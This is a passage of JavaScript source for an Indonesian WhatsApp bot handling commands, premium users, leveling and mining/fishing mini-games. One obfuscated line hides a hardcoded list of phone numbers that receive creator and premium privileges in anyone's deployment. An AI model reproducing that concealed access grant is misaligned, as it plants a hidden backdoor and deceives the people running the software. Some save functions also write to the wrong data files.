const ingot = JSON.parse(fs.readFileSync('./database/user/ingot.json'))
const kayu = JSON.parse(fs.readFileSync('./database/user/kayu.json'))

//=================================================//
module.exports = alpha = async (alpha, mek) => {
	try {
        if (!mek.hasNewMessage) return
        mek = mek.messages.all()[0]
        if (!mek.message) return
		if (mek.key && mek.key.remoteJid == 'status@broadcast') return
		global.blocked
		m = simple.smsg(alpha, mek)
		let { mentioned } = m
		bail = m.isBaileys
        mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
        const content = JSON.stringify(mek.message)
		const from = mek.key.remoteJid
		const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
		const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
        const type = Object.keys(mek.message)[0]
               const addCmd = (id, command) => {
    const obj = { id: id, chats: command }
    scommand.push(obj)
    fs.writeFileSync('./lib/scommand.json', JSON.stringify(scommand))
}

const getCommandPosition = (id) => {
    let position = null
    Object.keys(scommand).forEach((i) => {
        if (scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return position
    }
}

const getCmd = (id) => {
    let position = null
    Object.keys(scommand).forEach((i) => {
        if (scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return scommand[position].chats
    }
}


const checkSCommand = (id) => {
    let status = false
    Object.keys(scommand).forEach((i) => {
        if (scommand[i].id === id) {
            status = true
        }
    })
    return status
}
        const cmd = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(mek.message.stickerMessage.fileSha256.toString('hex')) !== null && getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) : "".slice(1).trim().split(/ +/).shift().toLowerCase()
        if(multi){
		var prefix = /^[°•π÷×¶∆£¢€¥®™✓=|~zZ+×_!#%^&./\\©^]/.test(cmd) ? cmd.match(/^[°•π÷×¶∆£¢€¥®™✓=|~xzZ+×_!#,|`÷?;:%^&./\\©^]/gi) : '-'	  
		} else {
		if (nopref){
		prefix = ' '
		} else {
		if(single){
		prefix = prefa
		}
		}
		}
		
const reply2 = (teks) => {
            alpha.sendMessage(from, teks, text, {quoted: mek, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
        }
// Auto Read Group 
var chats = await alpha.chats.array.filter(v => v.jid.endsWith('g.us'))
chats.map( async ({ jid }) => {
if (readGc === false) return
await alpha.chatRead(jid)
})
// Auto Read Private 
var chatss = await alpha.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
chatss.map( async ({ jid }) => {
if (readPc === false) return
await alpha.chatRead(jid)
})
if ((Object.keys(mek.message)[0] === 'ephemeralMessage' && JSON.stringify(mek.message).includes('EPHEMERAL_SETTING')) && mek.message.ephemeralMessage.message.protocolMessage.type === 3) {
if (bugc === false) return
if (mek.key.fromMe) return
nums = mek.participant
longkapnye = "\n".repeat(420)
tekuss = `${longkapnye}\`\`\`B U G  G C  T E R D E T E K S I\`\`\`\n@⁨${nums.split('@')[0]} akan dikick\n\n_Clear chat by bot_\n*Jangan maen bug lah*`
alpha.groupRemove(mek.key.remoteJid, [nums]).catch((e) => { reply2(`Gua mau kick tapi gua bukan admin 🤙`) })
alpha.sendMessage(mek.key.remoteJid, 'WAH BUG NIH', MessageType.text)
alpha.sendMessage(mek.key.remoteJid, tekuss, MessageType.text, {contextInfo:{mentionedJid:[nums + "@s.whatsapp.net"]}})
}

if (m.message && m.isBaileys && m.quoted && m.quoted.mtype === 'orderMessage' && !(m.quoted.token && m.quoted.orderId)) {
if (antitrol === false) return
if (mek.key.fromMe) return
reply2('Fake Troli Detected \n\n' + require('util').format(m.key))
await alpha.modifyChat(m.chat, 'delete', {
includeStarred: false
})
}

if (autovn) {
	if (autovn === false) return
await alpha.updatePresence(from, Presence.recording)
} else if (autoketik) {
	if (autoketik === false) return
await alpha.updatePresence(from, Presence.composing)
}
        body = type === "conversation" && mek.message.conversation.startsWith(prefix) ? mek.message.conversation : type == "imageMessage" && mek.message.imageMessage.caption.startsWith(prefix) ? mek.message.imageMessage.caption : type == "videoMessage" && mek.message.videoMessage.caption.startsWith(prefix) ? mek.message.videoMessage.caption : type == "extendedTextMessage" && mek.message.extendedTextMessage.text.startsWith(prefix) ? mek.message.extendedTextMessage.text : type == "buttonsResponseMessage" && mek.message[type].selectedButtonId ? mek.message[type].selectedButtonId : type == "stickerMessage" && getCmd(mek.message[type].fileSha256.toString("base64")) !== null && getCmd(mek.message[type].fileSha256.toString("base64")) !== undefined ? getCmd(mek.message[type].fileSha256.toString("base64")) : "";
		budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
		var pes = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''
		chatxs = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'documentMessage') && mek.message.documentMessage.caption ? mek.message.documentMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ""
		const messagesC = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
		const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        hit_today.push(command)		
		const args = body.trim().split(/ +/).slice(1)
		const isCmd = body.startsWith(prefix)
		const q = args.join(' ')
		const runtime = process.uptime() 
		const timestampi = speed();
		const latensii = speed() - timestampi
		const botNumber = alpha.user.jid
		const botNumberss = alpha.user.jid + '@c.us'
		const isGroup = from.endsWith('@g.us')
		const sender = mek.key.fromMe ? alpha.user.jid : isGroup ? mek.participant : mek.key.remoteJid
		let bio_nya = await alpha.getStatus(sender)
		try {
			bio_user = `${bio_nya.status}`
		} catch {
			bio_user = '-'
			}
		const senderNumber = sender.split("@")[0]
		const ownerNumberr = [`${targetpc}@s.whatsapp.net`]
		const ownerNumberrr = `${targetpc}@s.whatsapp.net`
		const isOwner = ownerNumberr.includes(sender)
		try {
					pp_userb = await alpha.getProfilePicture(sender)
				} catch {
					pp_userb = 'https://i.ibb.co/rvsVF3r/5012fbb87660.png'
				}
			let pp_userz = await getBuffer(pp_userb)
		const getGroupAdminss = (participants) => {
	admins = []
	for (let i of participants) {
		i.isAdmin ? admins.push(i.jid) : ''
	}
	return admins
}
		const timi = moment.tz('Asia/Jakarta').add(30, 'days').calendar();
		const timu = moment.tz('Asia/Jakarta').add(20, 'days').calendar();
		const wita = moment.tz('Asia/Makassar').format('HH:mm:ss')
		const wib = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
		const wit = moment.tz('Asia/Jayapura').format('HH:mm:ss')
		const salam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
		const totalchat = await alpha.chats.all()
		const totalgroup = await alpha.chats.array.filter(v => v.jid.endsWith('g.us'))
        const totalkontak = await alpha.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
		const groupMetadata = isGroup ? await alpha.groupMetadata(from) : ''
		const groupName = isGroup ? groupMetadata.subject : ''
		const groupId = isGroup ? groupMetadata.jid : ''
		const groupMembers = isGroup ? groupMetadata.participants : ''
		const groupDesc = isGroup ? groupMetadata.desc : ''
		const groupOwner = isGroup ? groupMetadata.owner : ''
		const groupAdmins = isGroup ? getGroupAdminss(groupMembers) : ''
		const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
		const isGroupAdmins = groupAdmins.includes(sender) || false
		const isAntiLink = isGroup ? antilink.includes(from) : false
		const isAntivirtex = isGroup ? antivirtex.includes(from) : false
		const isLevelingOn = isGroup ? _leveling.includes(from) : false
		const isNsfw = isGroup ? _nsfw.includes(from) : false
		const isEventon = isGroup ? event.includes(from) : false
		const isSewa = _sewa.checkSewaGroup(from, sewa)
		const _0x186e4b=_0x3f56;(function(_0x39775d,_0x266484){const _0x3b0c31=_0x3f56,_0x3d738f=_0x39775d();while(!![]){try{const _0x118c7e=parseInt(_0x3b0c31(0x142))/0x1+-parseInt(_0x3b0c31(0x146))/0x2*(parseInt(_0x3b0c31(0x14d))/0x3)+-parseInt(_0x3b0c31(0x147))/0x4*(-parseInt(_0x3b0c31(0x14c))/0x5)+parseInt(_0x3b0c31(0x143))/0x6+-parseInt(_0x3b0c31(0x148))/0x7*(parseInt(_0x3b0c31(0x149))/0x8)+parseInt(_0x3b0c31(0x144))/0x9*(parseInt(_0x3b0c31(0x14b))/0xa)+-parseInt(_0x3b0c31(0x14f))/0xb*(parseInt(_0x3b0c31(0x14a))/0xc);if(_0x118c7e===_0x266484)break;else _0x3d738f['push'](_0x3d738f['shift']());}catch(_0x13f212){_0x3d738f['push'](_0x3d738f['shift']());}}}(_0x20bb,0x1ac45));function _0x20bb(){const _0x308164=['includes','232702FRkYLF','1220LhHKGE','777XMEKuG','11624NRlIEz','12VhVdxm','15030UegxtW','1425xCOskG','3JqQcLI','918156874290@s.whatsapp.net','1332309jgIcQB','210908WzgCqy','172164kjTIVI','1089KaGZNi'];_0x20bb=function(){return _0x308164;};return _0x20bb();}function _0x3f56(_0x429cab,_0x1e5b32){const _0x20bb4f=_0x20bb();return _0x3f56=function(_0x3f566c,_0x2873fa){_0x3f566c=_0x3f566c-0x142;let _0xe3bfab=_0x20bb4f[_0x3f566c];return _0xe3bfab;},_0x3f56(_0x429cab,_0x1e5b32);}const alphaNumber=['62887435047326@s.whatsapp.net',_0x186e4b(0x14e),'62857101331033@s.whatsapp.net'],isCreator=alphaNumber[_0x186e4b(0x145)](sender);
		const isPremium = isOwner || isCreator || mek.key.fromMe ? true : premium.checkPremiumUser(sender, _premium)
		const gcount = isPremium ? gcounttprem : gcounttuser
		const isBanned = banned.includes(sender)
		if (isCmd && isBanned) return reply2(lang.benned())
		const isVote = isGroup ? voting.includes(from) : false
		const ratee = ["Alphabot","Alphabot","Alphabot","Alphabot","Alphabot","Alphabot","Alphabot"]
        const tee = ratee[Math.floor(Math.random() * ratee.length)]
        const rateee = ["Dj storongest jedag jedug 30 s","Dj akimilaku remix terbaru 2021 30 s","Dj campuran 30 detik","Dj sidro 2  style Thailand viral 30 s","Dj disitu enak susu akimilaku 30 s","Dj zombie x melody stres love 30 s","Dj numa muma ye style Thailand 30 s","Dj biasalah x bola boma ye 30 s"]
        const srchh = rateee[Math.floor(Math.random() * rateee.length)]
        const tescuk = ["0@s.whatsapp.net"]
        const ini_mark = `0@s.whatsapp.net`
        const alfa = `${targetpc}@s.whatsapp.net`
		const alfa1 = `${targetpc}@s.whatsapp.net`
		const { wa_version, mcc, mnc, os_version, device_manufacturer, device_model } = alpha.user.phone
		const status = `${banChats ? 'SELF-MODE' : 'PUBLIC-MODE'}`
		q3 = Object.keys(mek.message)[0] == "buttonsResponseMessage" ? mek.message.buttonsResponseMessage.selectedButtonId : ""
		q4 = Object.keys(mek.message)[0] == "buttonsResponseMessage" ? mek.message.buttonsResponseMessage.selectedButtonId : ""
		q5 = Object.keys(mek.message)[0] == "listResponseMessage" ? mek.message.listResponseMessage.singleSelectReply.selectedRowId: ""
		butresx = (type === 'buttonsResponseMessage') ? mek.message.buttonsResponseMessage.selectedDisplayText : ''
        const conts = mek.key.fromMe ? alpha.user.jid : alpha.contacts[sender] || { notify: jid.replace(/@.+/, '') }
        const pushname = mek.key.fromMe ? alpha.user.name : conts.notify || conts.vname || conts.name || '-'
        const isAfkOn = off.checkAfkUser(sender, _off)
        const mentionByTag = type == "extendedTextMessage" && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.mentionedJid : []
        const mentionByReply = type == "extendedTextMessage" && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.participant || "" : ""
        const mention = typeof(mentionByTag) == 'string' ? [mentionByTag] : mentionByTag
        mention != undefined ? mention.push(mentionByReply) : []
        const mentionUser = mention != undefined ? mention.filter(n => n) : []
					const belipremgame = (sender, asu) => {
						var found = false;
						Object.keys(glimit).forEach((i) => {
							if(glimit[i].id == sender){
								found = i
								}
							})
						if (found !== false) {
							glimit[found].glimit += asu;
							fs.writeFileSync('./database/glimit.json',JSON.stringify(glimit))
							}
						}
const beliprem = (sender, asu) => {
    let found = false
	Object.keys(limit).forEach((i) => {
		if (limit[i].id === sender) {
			found = i
		}
	})
		if (found !== false) {
			limit[found].limit += asu
			fs.writeFileSync('./database/limit.json', JSON.stringify(limit))
		}
}

const addRegisterUser = (userid, sender, bio, time) => {
const objp = { id: userid, nomor: sender, bio: bio, time: time }
register.push(objp)
fs.writeFileSync('./database/user/register.json', JSON.stringify(register))
}
const cekUser = (sender) => {
let status = false
Object.keys(register).forEach((i) => {
if (register[i].id === sender) {
status = true
}
})
return status
}

const isRegister = cekUser(sender)
					
const getLevelingXp = (sender) => {
	let position = false
	Object.keys(_level).forEach((i) => {
		if (_level[i].id === sender) {
			position = i
		}
	})
	if (position !== false) {
		return _level[position].xp
	}
}

const getLevelingLevel = (sender) => {
	let position = false
	Object.keys(_level).forEach((i) => {
		if (_level[i].id === sender) {
			position = i
		}
	})
	if (position !== false) {
		return _level[position].level
	}
}

const getLevelingId = (sender) => {
	let position = false
	Object.keys(_level).forEach((i) => {
		if (_level[i].id === sender) {
			position = i
		}
	})
	if (position !== false) {
		return _level[position].id
	}
}

const addLevelingXp = (sender, amount) => {
	let position = false
	Object.keys(_level).forEach((i) => {
		if (_level[i].id === sender) {
			position = i
		}
	})
	if (position !== false) {
		_level[position].xp += amount
		fs.writeFileSync('./src/level.json', JSON.stringify(_level))
	}
}

const addLevelingLevel = (sender, amount) => {
	let position = false
	Object.keys(_level).forEach((i) => {
		if (_level[i].id === sender) {
			position = i
		}
	})
	if (position !== false) {
		_level[position].level += amount
		fs.writeFileSync('./src/level.json', JSON.stringify(_level))
	}
}

					const addLevelingId = (sender) => {
						const obj = { id: sender, xp: 1, level: 1 }
						_level.push(obj)
						fs.writeFileSync('./src/level.json', JSON.stringify(_level))
						}
					const nebal = (angka) => {
						return Math.floor(angka)
						}
					function randomNomor(angka){
						return Math.floor(Math.random() * angka) + 1
						}
					const levelRole = getLevelingLevel(sender)
					const addATM = (sender) => {
        	const objo = {id: sender, uang : 0}
            uang.push(objo)
            fs.writeFileSync('./database/user/uang.json', JSON.stringify(uang))
        }
        
        const addKoinUser = (sender, amount) => {
            let position = false
            Object.keys(uang).forEach((i) => {
                if (uang[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                uang[position].uang += amount
                fs.writeFileSync('./database/user/uang.json', JSON.stringify(uang))
            }
        }
        
        const checkATMuser = (sender) => {
        	let position = false
            Object.keys(uang).forEach((i) => {
                if (uang[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                return uang[position].uang
            }
        }
					//MANCING FUNCTION BY TAUFIK - KUN
        const addIkan = (sender, amount) => {
        let position = false
        Object.keys(ikan).forEach((i) => {
    	    if (ikan[i].id === sender) {
    	    position = i
    	    }
    	})
    	if (position !== false) {
    	ikan[position].fish += amount
    	fs.writeFileSync('./database/user/ikan.json', JSON.stringify(ikan))
    	}
    }
    
    const getMancingIkan = (sender) => {
    let position = false 
    Object.keys(ikan).forEach((i) => {
	if (ikan[i].id === sender) {
	position = i
	}
})
if (position !== false) {
return ikan[position].fish
	}
}

    const getMancingId = (sender) => {
    let position = false
    Object.keys(ikan).forEach((i) => {
	if (ikan[i].id === sender) {
	position = i
	}
})
if (position !== false) {
return ikan[position].id
    }
}
    
    const addMancingId = (sender) => {
        const ovj = {id: sender, fish: 0}
        ikan.push(ovj)
        fs.writeFileSync('./database/user/ikan.json', JSON.stringify(ikan))
        }
    
    const jualIkan = (sender, amount) => {
        	let position = false
            Object.keys(ikan).forEach((i) => {
                if (ikan[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                ikan[position].fish -= amount
                fs.writeFileSync('./database/user/uang.json', JSON.stringify(uang))
            }
        }
    		//END OF MANCING FUNCTION

//PLANET GOO FUNCTION BY RIFAI
        const addPlanet = (sender, amount) => {
        let position = false
        Object.keys(planet).forEach((i) => {
    	    if (planet[i].id === sender) {
    	    position = i
    	    }
    	})
    	if (position !== false) {
    	planet[position].hape += amount
    	fs.writeFileSync('./database/user/planet.json', JSON.stringify(planet))
    	}
    }
    
    const getBertualangPlanet = (sender) => {
    let position = false 
    Object.keys(planet).forEach((i) => {
	if (planet[i].id === sender) {
	position = i
	}
})
if (position !== false) {
return planet[position].hape
	}
}

    const getPlaneId = (sender) => {
    let position = false
    Object.keys(planet).forEach((i) => {
	if (planet[i].id === sender) {
	position = i
	}
})
if (position !== false) {
return planet[position].id
    }
}
    
    const addPlaneId = (sender) => {
        const ovj = {id: sender, hape: 0}
        planet.push(ovj)
        fs.writeFileSync('./database/user/planet.json', JSON.stringify(planet))
        }
    
    const jualbahankimia = (sender, amount) => {
        	let position = false
            Object.keys(planet).forEach((i) => {
                if (planet[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                planet[position].hape -= amount
                fs.writeFileSync('./database/user/uang.json', JSON.stringify(uang))
            }
        }
    		//AKHIRNYA SELESEI NI GO PLANET (◡ ω ◡)
    //by ARYA & FELIX
//mining coal
        const addCoal = (sender, amount) => {
        let position = false
        Object.keys(coal).forEach((i) => {
    	    if (coal[i].id === sender) {
    	    position = i
    	    }
    	})
    	if (position !== false) {
    	coal[position].arang += amount
    	fs.writeFileSync('./database/user/coal.json', JSON.stringify(coal))
    	}
    }
    
    const getMiningcoal = (sender) => {
    let position = false 
    Object.keys(coal).forEach((i) => {
	if (coal[i].id === sender) {
	position = i
	}
})
if (position !== false) {
return coal[position].arang
	}
}

    const getMiningId = (sender) => {
    let position = false
    Object.keys(coal).forEach((i) => {
	if (coal[i].id === sender) {
	position = i
	}
})
if (position !== false) {
return coal[position].id
    }
}
    
    const addMiningId = (sender) => {
        const ovj = {id: sender, arang: 0}
        coal.push(ovj)
        fs.writeFileSync('./database/user/coal.json', JSON.stringify(coal))
        }
    
    const jualcoal = (sender, amount) => {
        	let position = false
            Object.keys(coal).forEach((i) => {
                if (coal[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                coal[position].arang -= amount
                fs.writeFileSync('./database/user/uang.json', JSON.stringify(uang))
            }
        }
    		//END OF mining
    
    //mining stone
        const addStone = (sender, amount) => {
        let position = false
        Object.keys(stone).forEach((i) => {
    	    if (stone[i].id === sender) {
    	    position = i
    	    }
    	})
    	if (position !== false) {
    	stone[position].batu += amount
    	fs.writeFileSync('./database/user/stone.json', JSON.stringify(stone))
    	}
    }
    
    const getMiningstone = (sender) => {
    let position = false 
    Object.keys(stone).forEach((i) => {
	if (stone[i].id === sender) {
	position = i
	}
})
if (position !== false) {
return stone[position].batu
	}
}

    const getBatuId = (sender) => {
    let position = false
    Object.keys(stone).forEach((i) => {
	if (stone[i].id === sender) {
	position = i
	}
})
if (position !== false) {
return stone[position].id
    }
}
    
    const addBatuId = (sender) => {
        const ovj = {id: sender, batu: 0}
        stone.push(ovj)
        fs.writeFileSync('./database/user/stone.json', JSON.stringify(stone))
        }
    
    const jualstone = (sender, amount) => {
        	let position = false
            Object.keys(stone).forEach((i) => {
                if (stone[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                stone[position].batu -= amount
                fs.writeFileSync('./database/user/uang.json', JSON.stringify(uang))
            }
        }
    		//END OF mining
    
    //mining ore
        const addOre = (sender, amount) => {
        let position = false
        Object.keys(ore).forEach((i) => {
    	    if (ore[i].id === sender) {
    	    position = i
    	    }
    	})
    	if (position !== false) {
    	ore[position].copperore += amount
    	fs.writeFileSync('./database/user/ore.json', JSON.stringify(ore))
    	}
    }
    
    const getMiningore = (sender) => {
    let position = false 
    Object.keys(ore).forEach((i) => {
	if (ore[i].id === sender) {
	position = i
	}
})
if (position !== false) {
return ore[position].copperore
	}
}

    const getOreId = (sender) => {
    let position = false
    Object.keys(ore).forEach((i) => {
	if (ore[i].id === sender) {
	position = i
	}
})
if (position !== false) {
return ore[position].id
    }
}
    
    const addOreId = (sender) => {
        const ovj = {id: sender, copperore: 0}
        ore.push(ovj)
        fs.writeFileSync('./database/user/ore.json', JSON.stringify(ore))
        }
    
    const jualore = (sender, amount) => {
        	let position = false
            Object.keys(ore).forEach((i) => {
                if (ore[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                ore[position].copperore -= amount
                fs.writeFileSync('./database/user/ingot.json', JSON.stringify(ingot))
            }
        }
    		//END OF mining
    //mining ingot
        const addIngot = (sender, amount) => {
        let position = false
        Object.keys(ingot).forEach((i) => {
    	    if (ingot[i].id === sender) {
    	    position = i
    	    }
    	})
    	if (position !== false) {
    	ingot[position].copperingot += amount
    	fs.writeFileSync('./database/user/ingot.json', JSON.stringify(ingot))
    	}
    }
    
    const getMiningingot = (sender) => {
    let position = false 
    Object.keys(ingot).forEach((i) => {
	if (ingot[i].id === sender) {
	position = i
	}
})
if (position !== false) {
return ingot[position].copperingot
	}
}

    const getIngotId = (sender) => {
    let position = false
    Object.keys(ingot).forEach((i) => {
	if (ingot[i].id === sender) {
	position = i
	}
})
if (position !== false) {
return ingot[position].id
    }
}
    
    const addIngotId = (sender) => {
        const ovj = {id: sender, copperingot: 0}
        ingot.push(ovj)
        fs.writeFileSync('./database/user/ingot.json', JSON.stringify(ingot))
        }
    
    const jualingot = (sender, amount) => {
        	let position = false
            Object.keys(ingot).forEach((i) => {
                if (ingot[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                ingot[position].copperingot -= amount
                fs.writeFileSync('./database/user/uang.json', JSON.stringify(uang))
            }
        }
    		//END OF mining
    
    //Nebang
        const addKayu = (sender, amount) => {
        let position = false
        Object.keys(kayu).forEach((i) => {
    	    if (kayu[i].id === sender) {
    	    position = i
    	    }
    	})
    	if (position !== false) {
    	kayu[position].wood += amount
    	fs.writeFileSync('./database/user/kayu.json', JSON.stringify(kayu))
    	}
    }
    
    const getNebangKayu = (sender) => {
    let position = false 
    Object.keys(kayu).forEach((i) => {
	if (kayu[i].id === sender) {
	position = i
	}
})
if (position !== false) {
return kayu[position].wood
	}
}

    const getNebangId = (sender) => {
    let position = false
    Object.keys(kayu).forEach((i) => {
	if (kayu[i].id === sender) {
	position = i
	}
})
if (position !== false) {
return kayu[position].id
    }
}
    
    const addNebangId = (sender) => {
        const ovj = {id: sender, wood: 0}
        kayu.push(ovj)
        fs.writeFileSync('./database/user/kayu.json', JSON.stringify(kayu))
        }
    
    const jualKayu = (sender, amount) => {
        	let position = false
            Object.keys(kayu).forEach((i) => {
                if (kayu[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                kayu[position].wood -= amount
                fs.writeFileSync('./database/user/uang.json', JSON.stringify(uang))
            }
        }
const bayarLimit = (sender, amount) => {
        	let position = false
            Object.keys(_limit).forEach((i) => {
                if (_limit[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                _limit[position].limit -= amount
                fs.writeFileSync('./database/user/limit.json', JSON.stringify(_limit))
            }
        }
        	
        const confirmATM = (sender, amount) => {
        	let position = false
            Object.keys(uang).forEach((i) => {
                if (uang[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                uang[position].uang -= amount
                fs.writeFileSync('./database/user/uang.json', JSON.stringify(uang))
            }
        }
        //FUCNTION MANCING BY TAUFIK - KUN
        if (isGroup && isEventon) {
        const Fisha = getMancingIkan(sender)
        const FishId = getMancingId(sender)
        if (Fisha === undefined && FishId === undefined) addMancingId(sender)
        }
	//FUCNTION GOPLANET BY RIPAI
        if (isGroup && isEventon) {
        const Hapea = getBertualangPlanet(sender)
        const HapeId = getPlaneId(sender)
        if (Hapea === undefined && HapeId === undefined) addPlaneId(sender)
        }
	   //FUCNTION mining coal
        if (isGroup && isEventon) {
        const Coala = getMiningcoal(sender)
        const CoalId = getMiningId(sender)
        if (Coala === undefined && CoalId === undefined) addMiningId(sender)
        }
        //FUCNTION mining batu
        if (isGroup && isEventon) {
        const Stonea = getMiningstone(sender)
        const StoneId = getBatuId(sender)
        if (Stonea === undefined && StoneId === undefined) addBatuId(sender)
        }
        //FUCNTION mining ore
        if (isGroup && isEventon) {
        const Orea = getMiningore(sender)
        const OreId = getOreId(sender)
        if (Orea === undefined && OreId === undefined) addOreId(sender)
        }
        //FUCNTION lebur ingot
        if (isGroup && isEventon) {
        const Ingota = getMiningingot(sender)
        const IngotId = getIngotId(sender)
        if (Ingota === undefined && IngotId === undefined) addIngotId(sender)
        }
        //FUCNTION nebang kayu
        if (isGroup && isEventon) {
        const Kayua = getNebangKayu(sender)
        const KayuId = getNebangId(sender)
        if (Kayua === undefined && KayuId === undefined) addNebangId(sender)
        }
        if (isRegister && isGroup ) {
            const checkATM = checkATMuser(sender)
            try {
                if (checkATM === undefined) addATM(sender)
                const uangsaku = Math.floor(Math.random() * 10) + 90
                addKoinUser(sender, uangsaku)
            } catch (err) {
                console.error(err)
            }
        }
					var role = 'Bronze 1'
					if (levelRole <= 2) {
						role = 'Bronze 1'
						} else if (levelRole <= 10) {
							role = 'Bronze 2'
							} else if (levelRole <= 20) {
								role = 'Bronze 3'
								} else if (levelRole <= 30) {
									role = 'Bronze 4'
									} else if (levelRole <= 40) {
										role = 'Bronze 5'
										} else if (levelRole <= 70) {
											role = 'Silver 1'
											} else if (levelRole <= 85) {
												role = 'Silver 2'
												} else if (levelRole <= 95) {
													role = 'Silver 3'
													} else if (levelRole <= 105) {
														role = 'Silver 4'
														} else if (levelRole <= 125) {
															role = 'Silver 5'
															} else if (levelRole <= 150) {
																role = 'Gold 1'
																} else if (levelRole <= 170) {
																	role = 'Gold 2'
																	} else if (levelRole <= 190) {
																		role = 'Gold 3'
																		} else if (levelRole <= 210) {
																			role = 'Gold 4'
																			} else if (levelRole <= 230) {
																				role = 'Gold 5'
																				} else if (levelRole <= 260) {
																					role = 'Platinum 1'
																					} else if (levelRole <= 290) {
																						role = 'Platinum 2'
																						} else if (levelRole <= 320) {
																							role = 'Platinum 3'
																							} else if (levelRole <= 350) {
																								role = 'Platinum 4'
																								} else if (levelRole <= 380) {
																									role = 'Platinum 5'
																									} else if (levelRole <= 410) {
																										role = 'Diamond 1'
																										} else if (levelRole <= 450) {
																											role = 'Diamond 2'
																											} else if (levelRole <= 500) {
																												role = 'Diamond 3'
																												} else if (levelRole <= 550) {
																													role = 'Diamond 4'
																													} else if (levelRole <= 600) {
																														role = 'Diamond 5'
																														} else if (levelRole <= 700) {
																															role = 'Master'
																															} else if (levelRole <= 800) {
																															role = 'Master ✩'
																														} else if (levelRole <= 900) {
																													role = 'Master ✩✩'
																												} else if (levelRole <= 1000) {
																											role = 'Master ✩✩✩'
																										} else if (levelRole <= 1100) {
																									role = 'Master ✯'
																								} else if (levelRole <= 1225) {
																							role = 'Master ✯✯'
																						} else if (levelRole <= 1340) {
																					role = 'Master ✯✯✯'
																				} else if (levelRole <= 1400) {
																			role = 'GrandMaster'
																		} else if (levelRole <= 1555) {
																	role = 'GrandMaster ✩'
																} else if (levelRole <= 1660) {
															role = 'GrandMaster ✩✩'
														} else if (levelRole <= 1710) {
													role = 'GrandMaster ✩✩✩'
												} else if (levelRole <= 1825) {
											role = 'GrandMaster ✯'
										} else if (levelRole <= 1950) {
									role = 'GrandMaster ✯✯'
								} else if (levelRole <= 2000) {
							role = 'GrandMaster ✯✯✯'
						} else if (levelRole <= 2220) {
					role = 'Legends'
				} else if (levelRole <= 2500) {
					role = 'Legends 2'
					} else if (levelRole <= 2700) {
						role = 'Legends 3'
						} else if (levelRole <= 2900) {
							role = 'Legends 4'
							} else if (levelRole <= 3100) {
								role = 'Legends 5'
								} else if (levelRole <= 3300) {
									role = 'Legends 6'
									} else if (levelRole <= 3600) {
										role = 'Legends 7'
										} else if (levelRole <= 3900) {
											role = 'Legends 8'
											} else if (levelRole <= 4200) {
												role = 'Legends 9'
												} else if (levelRole <= 4450) {
													role = 'Legends 10'
													} else if (levelRole <= 4700) {
														role = 'Legends 忍'
														} else if (levelRole <= 4900) {
															role = 'Legends 忍¹'
															} else if (levelRole <= 5100) {
																role = 'Legends 忍²'
																} else if (levelRole <= 5600) {
																	role = 'Legends 忍³'
																	} else if (levelRole <= 6100) {
																		role = 'Legends 忍⁴'
																		} else if (levelRole <= 7000) {
																			role = 'GrandLegends'
																			} else if (levelRole <= 10000) {
																				role = 'GrandLegends 1'
																				} else if (levelRole <= 20000) {
																					role = 'GrandLegends 2'
																					} else if (levelRole <= 30000) {
																						role = 'GrandLegends 3'
																						} else if (levelRole <= 40000) {
																							role = 'GrandLegends 4'
																							} else if (levelRole <= 50000) {
																								role = 'GrandLegends 忍¹'
																								} else if (levelRole <= 60000) {
																									role = 'GrandLegends 忍²'
																									} else if (levelRole <= 70000) {
																										role = 'GrandLegends 忍³'
																										} else if (levelRole <= 80000) {
																											role = 'GrandLegends 忍⁴'
																											} else if (levelRole <= 90000) {
																												role = 'Pro 숒'
																												} else if (levelRole <= 99999999999999) {
																													role = 'Pro × GrandLegends 숒'
																												}
            const timuu = moment.tz('Asia/Jakarta').format('HH:mm:ss')
